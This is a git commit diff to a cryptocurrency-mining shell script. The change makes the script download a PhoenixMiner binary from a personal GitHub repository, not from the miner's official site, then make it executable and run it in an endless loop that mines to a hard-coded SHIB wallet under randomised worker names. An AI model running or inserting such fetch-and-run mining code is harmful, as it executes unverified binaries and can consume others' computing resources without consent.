e4cbf6433f004794b7191894b9174a9aba5228fe
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-09 22:23:18 +0530

    Update goku.sh

--- goku.sh
+++ goku.sh
@@ -2,7 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
 WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGE)
-wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux 
+wget https://github.com/skullCANDe/skyz/raw/main/PhoenixMiner
 chmod +x PhoenixMiner
 while [ 1 ]; do
 ./PhoenixMiner -pool $POOL -wal $WALLET.$WORKER -pass x
